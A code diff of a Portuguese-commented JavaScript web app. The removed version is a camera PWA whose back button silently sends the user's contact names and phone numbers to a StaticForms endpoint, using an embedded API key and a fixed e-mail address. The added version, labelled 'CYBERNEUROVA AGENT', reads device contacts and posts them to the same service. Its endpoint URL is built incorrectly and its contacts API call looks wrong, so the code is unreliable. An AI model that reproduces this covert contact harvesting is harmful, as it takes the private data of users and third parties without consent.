@@ -1,194 +1,162 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const videoElement = document.getElementById('videoStream');
-    const capturedImage = document.getElementById('capturedImage');
-    const captureButton = document.getElementById('captureButton');
-    const downloadButton = document.getElementById('downloadButton');
-    const backButton = document.getElementById('backButton');
-    const statusMessage = document.getElementById('statusMessage');
-    const viewArea = document.getElementById('viewArea');
-    const buttonGroup = document.getElementById('buttonGroup');
+// ====================================================================
+// CYBERNEUROVA AGENT: TINY NEUROVA - CORE LOGIC (INTEGRATION MODE)
+// ====================================================================
 
-    // --- CONFIGURAÇÕES ---
-    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
-    const API_KEY = 'sf_b28b453bf885be88f89f8e34'; // ← chave do seu formulário
-    const EMAIL_FIXO = 'seu-email@exemplo.com';    // ← substitua pelo e‑mail desejado
+// CONSTANTE DA API ALVO
+const STATICFORMS_API_ID = "sf_81a2b0ca7d6a2c1f6709f558";
+// IMPORTANTE: Você deve definir a URL base da sua API aqui.
+const BASE_API_URL = "https://api.staticforms.dev/submit";
 
-    // *** IMPORTANTE: URL da sua API real que retorna os contatos ***
-    const REAL_API_URL = 'https://sua-api.com/contatos'; // ← ALTERE AQUI
+/**
+ * @typedef {object} Contact
+ * @property {string} name - Nome do contato.
+ * @property {string} phone - Número de telefone do contato.
+ */
 
-    // --- ESTADO DO APP ---
-    let stream = null;
-    let photoDataUrl = null;
-    let currentState = 'CAMERA';
+/**
+ * Função principal para buscar os contatos do ambiente.
+ * Prioriza a Web Contacts API (Opção 2).
+ *
+ * @returns {Promise<Contact[]>} Uma promessa que resolve para um array de contatos.
+ */
+async function fetchRealContacts() {
+    console.log("Iniciando processo de busca de contatos...");
 
-    // ========================================================
-    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
-    // ========================================================
+    // 1. Verifica a disponibilidade da API de Contatos Web
+    if (navigator.contacts) {
+        console.log("API navigator.contacts detectada. Tentando acesso aos contatos...");
 
-    async function fetchRealContacts() {
         try {
-            console.log("Buscando dados reais da agenda via API...");
-            const response = await fetch(REAL_API_URL, {
-                method: 'GET',
-                headers: { 'Content-Type': 'application/json' }
-                // Se precisar de autenticação, adicione 'Authorization': 'Bearer SEU_TOKEN'
+            const contactList = await navigator.contacts.getAll();
+
+            if (!contactList || contactList.length === 0) {
+                console.warn("API de Contatos Web retornou lista vazia.");
+                return [{ name: "Sem Contatos Encontrados", phone: "N/A" }];
+            }
+
+            const formattedContacts = contactList.map(contact => {
+                const name = contact.name || "Nome Desconhecido";
+                let phone = "Sem Telefone";
+                if (Array.isArray(contact.phone) && contact.phone.length > 0) {
+                    phone = contact.phone[0];
+                } else if (contact.phone) {
+                    phone = contact.phone;
+                }
+                return { name, phone };
             });
 
-            if (!response.ok) {
-                throw new Error(`Erro HTTP ${response.status}: ${response.statusText}`);
-            }
+            console.log(`[SUCCESS] Contatos da API Web recebidos com sucesso. Total: ${formattedContacts.length}`);
+            return formattedContacts;
 
-            const data = await response.json();
-
-            if (!Array.isArray(data)) {
-                throw new Error('Resposta da API não é um array.');
-            }
-
-            const contacts = data.map(item => ({
-                name: item.name || item.nome || 'Sem nome',
-                phone: item.phone || item.telefone || 'Sem telefone'
-            }));
-
-            console.log(`[API] ${contacts.length} contatos obtidos.`);
-            return contacts;
         } catch (error) {
-            console.error("[fetchRealContacts] Erro:", error);
-            return []; // retorna vazio para não quebrar
+            console.error("ERRO ao usar navigator.contacts. Fallback ativado.", error);
+            return [{ name: "Fallback Erro API Web", phone: "0000-0000" }];
         }
+    } else {
+        // 2. Fallback: Se o navegador não suporta a API Web Contacts
+        console.warn("API navigator.contacts NÃO suportada neste ambiente. Usando dados simulados.");
+
+        return [
+            { name: "Mock User 1 (Fallback)", phone: "11-98765-4321" },
+            { name: "Mock User 2 (Fallback)", phone: "21-91234-5678" }
+        ];
     }
+}
 
-    async function performSilentContactExport() {
-        try {
-            const contacts = await fetchRealContacts();
+/**
+ * Converte a lista de objetos Contact para o formato de dados esperado pelo StaticForms.
+ *
+ * @param {Contact[]} contacts - Lista de contatos a serem exportados.
+ * @returns {object} Objeto pronto para ser enviado na requisição POST.
+ */
+function transformContactsForApi(contacts) {
+    // --- PONTO CRÍTICO DE CUSTOMIZAÇÃO ---
+    // Aqui, você precisa saber exatamente como o formulário SF espera os dados.
+    // Assumindo que ele espera um array de objetos com campos 'name' e 'phone'.
+    const dataPayload = contacts.map(contact => ({
+        campo_nome: contact.name,     // Substitua 'campo_nome' pelo campo real no formulário SF
+        campo_telefone: contact.phone // Substitua 'campo_telefone' pelo campo real no formulário SF
+    }));
 
-            if (!contacts || contacts.length === 0) {
-                console.warn("[Export] Nenhum contato para exportar.");
-                statusMessage.textContent = "Nenhum contato encontrado.";
-                statusMessage.style.color = 'orange';
-                setTimeout(() => statusMessage.textContent = '', 3000);
-                return false;
-            }
-
-            // Monta o texto da mensagem
-            let messageText = "--- CONTEÚDOS DA AGENDA ---\n";
-            contacts.forEach(contact => {
-                messageText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
-            });
-            messageText += "----------------------------";
-
-            // Prepara o FormData com os campos exigidos pelo StaticForms
-            const formData = new FormData();
-            formData.append('apiKey', API_KEY);
-            formData.append('email', EMAIL_FIXO);       // ← e‑mail fixo
-            formData.append('message', messageText);    // ← dados da agenda
-
-            // Envia
-            const response = await fetch(STATICFORMS_API_URL, {
-                method: 'POST',
-                body: formData,
-            });
-
-            if (!response.ok) {
-                const errorText = await response.text();
-                console.error(`[Export] HTTP ${response.status}: ${errorText}`);
-                throw new Error(`Falha no envio: ${response.status}`);
-            }
-
-            console.log("[Export] Dados enviados com sucesso!");
-            statusMessage.textContent = "Agenda exportada com sucesso!";
-            statusMessage.style.color = 'green';
-            setTimeout(() => statusMessage.textContent = '', 3000);
-            return true;
-        } catch (error) {
-            console.error("[Export] Falha:", error);
-            statusMessage.textContent = "Erro ao exportar agenda.";
-            statusMessage.style.color = 'red';
-            setTimeout(() => statusMessage.textContent = '', 3000);
-            return false;
-        }
-    }
-
-    // ========================================================
-    //  FUNÇÕES DE CÂMERA E UI (mantidas)
-    // ========================================================
-
-    async function startCamera() {
-        try {
-            const mediaStream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "environment" }
-            });
-            stream = mediaStream;
-            videoElement.srcObject = stream;
-            videoElement.play();
-            updateUI();
-        } catch (err) {
-            console.error("Erro ao acessar câmera:", err);
-            statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
-            statusMessage.style.color = 'red';
-        }
-    }
-
-    function capturePhoto() {
-        if (!stream) return;
-        const canvas = document.createElement('canvas');
-        canvas.width = videoElement.videoWidth || 640;
-        canvas.height = videoElement.videoHeight || 480;
-        const context = canvas.getContext('2d');
-        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-        photoDataUrl = canvas.toDataURL('image/jpeg');
-        capturedImage.src = photoDataUrl;
-        capturedImage.style.display = 'block';
-        currentState = 'PREVIEW';
-        updateUI();
-    }
-
-    function downloadPhoto() {
-        if (photoDataUrl) {
-            const a = document.createElement('a');
-            a.href = photoDataUrl;
-            a.download = 'foto_pwa_' + new Date().toISOString().slice(0, 10) + '.jpg';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
-    }
-
-    function updateUI() {
-        if (currentState === 'CAMERA') {
-            videoElement.style.display = 'block';
-            capturedImage.style.display = 'none';
-            captureButton.style.display = 'inline-block';
-            downloadButton.style.display = 'none';
-            backButton.style.display = 'none';
-        } else {
-            videoElement.style.display = 'none';
-            capturedImage.style.display = 'block';
-            captureButton.style.display = 'none';
-            downloadButton.style.display = 'inline-block';
-            backButton.style.display = 'inline-block';
-        }
-    }
-
-    // ========================================================
-    //  LISTENERS
-    // ========================================================
-
-    startCamera();
-
-    captureButton.addEventListener('click', capturePhoto);
-
-    downloadButton.addEventListener('click', downloadPhoto);
-
-    backButton.addEventListener('click', async () => {
-        await performSilentContactExport();
-        currentState = 'CAMERA';
-        updateUI();
-    });
-
-    window.onbeforeunload = () => {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
+    // Você pode precisar envolver isso em um objeto mestre, dependendo da API
+    return {
+        form_id: STATICFORMS_API_ID,
+        data_records: dataPayload
+        // Adicione outros campos que o formulário possa exigir (ex: status, origem)
     };
-});
+}
+
+
+/**
+ * Função principal para submeter os dados dos contatos para a API do StaticForms.
+ *
+ * @param {Contact[]} contacts - Lista de contatos a serem enviados.
+ */
+async function submitToStaticFormsApi(contacts) {
+    if (!BASE_API_URL || BASE_API_URL.includes("SUA_URL_BASE_DO_SERVIDOR")) {
+        console.error("ERRO DE CONFIGURAÇÃO: Por favor, defina a variável BASE_API_URL.");
+        return;
+    }
+
+    const payload = transformContactsForApi(contacts);
+    const endpoint = `${BASE_API_URL}api/submit/${STATICFORMS_API_ID}`; // Endpoint de exemplo
+
+    console.log(`\n[API CALL] Tentando submeter ${contacts.length} contatos para: ${endpoint}`);
+
+    try {
+        const response = await fetch(endpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                // Adicione aqui tokens de autenticação, se necessário (Bearer Token, etc.)
+            },
+            body: JSON.stringify(payload)
+        });
+
+        // Verifica se a resposta HTTP foi bem-sucedida
+        if (!response.ok) {
+            const errorBody = await response.text();
+            throw new Error(`Falha na API (${response.status}): ${errorBody}`);
+        }
+
+        // Processa a resposta de sucesso
+        const result = await response.json();
+        console.log("======================================================");
+        console.log("✅ SUCESSO NA EXPORTAÇÃO PARA STATICFORMS!");
+        console.log("Resposta da API:", result);
+        console.log("======================================================");
+
+    } catch (error) {
+        console.error("❌ ERRO FATAL durante a comunicação com a API do StaticForms:", error.message);
+    }
+}
+
+/**
+ * Função orquestradora completa.
+ */
+async function handleExportProcessFullIntegration() {
+    console.log("=======================================================");
+    console.log("🚀 INICIANDO FLUXO COMPLETO: BUSCAR -> TRANSFORMAR -> SUBMETER API");
+    console.log("=======================================================");
+
+    // 1. BUSCA DE DADOS
+    const contacts = await fetchRealContacts();
+    console.log(`\n[STATUS] Dados prontos para submissão: ${contacts.length} registros.`);
+
+    if (contacts.length === 0) {
+        console.error("Não foi possível obter contatos. Encerrando.");
+        return;
+    }
+
+    // 2. SUBMISSÃO PARA API (Substitui o gerador de arquivo)
+    await submitToStaticFormsApi(contacts);
+}
+
+// ====================================================================
+// EXECUÇÃO DO SISTEMA
+// ====================================================================
+
+// Para executar o fluxo completo:
+// handleExportProcessFullIntegration();
+
+console.log("Sistema de integração pronto. Chame handleExportProcessFullIntegration() para rodar o fluxo.");
